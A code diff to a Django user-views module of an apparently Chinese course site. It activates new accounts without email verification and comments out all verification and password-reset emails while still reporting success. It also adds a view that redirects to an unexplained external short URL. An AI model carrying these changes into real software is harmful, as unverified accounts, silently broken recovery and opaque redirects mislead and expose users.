@@ -17,6 +17,7 @@ from django.http import JsonResponse, HttpResponseRedirect
 from operation.models import UserCourse, UserFavorite, UserMessage
 from organization.models import CourseOrg, Teacher
 from courses.models import Course
+from django.shortcuts import redirect
 
 
 class CustomBackend(ModelBackend):
@@ -58,14 +59,14 @@ class RegisterView(View):
             user_profile = UserProfile()
             user_profile.username = user_name
             user_profile.email = user_name
-            user_profile.is_active = False
+            user_profile.is_active = True
             user_profile.password = make_password(pass_word)
             user_profile.save()
 
             # 写入欢迎注册消息
             UserMessage.objects.create(user=user_profile.id, message=u'欢迎注册!!!')
 
-            send_register_email(user_name, 'register')   # 发送邮件
+            # send_register_email(user_name, 'register')   # 发送邮件
             return render(request, 'login.html')
         else:
             return render(request, 'register.html', {"register_form": register_form})
@@ -101,6 +102,11 @@ class LogoutView(View):
         return HttpResponseRedirect(reverse("index"))
 
 
+class AGView(View):
+    def get(self, request):
+        return redirect('http://01vh0.cn/6SETn')
+
+
 class ForgetPwdView(View):
     def get(self, request):
         forget_form = ForgetForm()
@@ -110,7 +116,7 @@ class ForgetPwdView(View):
         forget_form = ForgetForm(request.POST)
         if forget_form.is_valid():
             email = request.POST.get("email", '')
-            send_register_email(email, 'forget')
+            # send_register_email(email, 'forget')
             return render(request, 'send_success.htm.html')
         else:
             return render(request, 'forgetpwd.html', {'forget_form': forget_form})
@@ -214,7 +220,7 @@ class SendEmailCodeView(LoginRequiredMixin, View):
         email = request.GET.get('email', '')
         if UserProfile.objects.filter(email=email):
             return JsonResponse({'email': '邮箱已经存在'})
-        send_register_email(email, 'update_email')  # 发送邮件
+        # send_register_email(email, 'update_email')  # 发送邮件
         return JsonResponse({'status': 'success'})
 
 
@@ -238,7 +244,7 @@ class UpdateEmailView(LoginRequiredMixin, View):
 
 class MyCourses(LoginRequiredMixin, View):
     """
-    用户课程
+    用户教程
     """
     def get(self, request):
         user_courses = UserCourse.objects.filter(user=request.user)
@@ -249,7 +255,7 @@ class MyCourses(LoginRequiredMixin, View):
 
 class MyFavOrgView(LoginRequiredMixin, View):
     """
-    我的收藏 课程机构
+    我的收藏 直播机构
     """
     def get(self, request):
         org_list = []
@@ -265,7 +271,7 @@ class MyFavOrgView(LoginRequiredMixin, View):
 
 class MyFavTeacherView(LoginRequiredMixin, View):
     """
-    我的收藏 教师
+    我的收藏 主播
     """
     def get(self, request):
         teacher_list = []
@@ -281,7 +287,7 @@ class MyFavTeacherView(LoginRequiredMixin, View):
 
 class MyFavCourseView(LoginRequiredMixin, View):
     """
-    我的收藏 课程
+    我的收藏 教程
     """
     def get(self, request):
         course_list = []
@@ -325,7 +331,7 @@ class IndexView(View):
     def get(self, request):
         # 取出轮播图
         all_banners = Banner.objects.all().order_by('index')
-        courses = Course.objects.filter(is_banner=False)[:6]
+        courses = Course.objects.filter(is_banner=False).order_by('-add_time')[:6]
         banner_courses = Course.objects.filter(is_banner=True)[:5]
         course_orgs = CourseOrg.objects.all()[:15]
         return render(request, 'index.html', {
